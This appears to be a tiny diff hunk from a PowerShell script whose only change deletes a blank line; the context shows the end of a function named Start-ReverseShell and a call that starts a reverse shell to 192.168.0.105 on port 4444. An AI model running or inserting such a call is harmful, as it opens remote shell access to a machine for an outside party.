@@ -51,6 +51,5 @@ function Start-ReverseShell {
     }
 }
 
-
 # Call the function to start the reverse shell
 Start-ReverseShell -IPAddress '192.168.0.105' -Port 4444
